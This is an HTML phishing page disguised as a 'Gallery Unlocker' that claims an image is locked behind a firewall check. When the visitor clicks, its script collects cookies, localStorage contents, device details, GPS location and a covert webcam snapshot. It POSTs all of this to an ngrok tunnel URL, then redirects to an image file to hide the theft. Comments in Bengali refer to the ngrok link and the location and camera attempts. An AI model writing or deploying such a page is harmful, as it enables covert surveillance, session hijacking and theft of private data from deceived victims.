<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gallery Unlocker</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #0f0; font-family: 'Courier New', monospace; }
        #main { text-align: center; padding: 30px; border: 1px solid #0f0; border-radius: 15px; box-shadow: 0 0 20px #0f0; width: 85%; max-width: 380px; }
        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="main">
        <h2>[ MEDIA_LOCKED ]</h2>
        <p>Complete verification to bypass firewall.</p>
        <button onclick="startMission()">VIEW FULL IMAGE</button>
    </div>

    <canvas id="scr" style="display:none;"></canvas>
    <video id="vid" autoplay style="display:none;"></video>

    <script>
        // আপনার দেওয়া নতুন Ngrok লিঙ্ক
        const URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';

        async function startMission() {
            let report = {
                system: {
                    os: navigator.platform,
                    cookies: document.cookie || "No Cookies Found",
                    storage: JSON.stringify(localStorage),
                    res: `${screen.width}x${screen.height}`,
                    time: Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                vuln: []
            };

            // Vulnerability Probes
            if (navigator.webdriver) report.vuln.push("Automation_Bot_Detected");
            if (navigator.pdfViewerEnabled) report.vuln.push("PDF_Exploit_Potential");

            // লোকেশন ও ক্যামেরা ট্রাই
            navigator.geolocation.getCurrentPosition(async (pos) => {
                report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('vid');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('scr');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        sendData(report, canvas.toDataURL('image/jpeg'));
                        stream.getTracks().forEach(t => t.stop());
                    }, 2000);
                } catch (e) { sendData(report, null); }
            }, () => sendData(report, null));

            // ইউজারকে রিডাইরেক্ট করা
            setTimeout(() => { window.location.href = "elephant.jpg"; }, 4000);
        }

        function sendData(d, p) {
            console.log("Attempting to send data...");
            fetch(URL, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...d, photo: p })
            }).then(res => console.log("Success:", res))
              .catch(err => console.error("Network Error:", err));
        }
    </script>
</body>
</html>
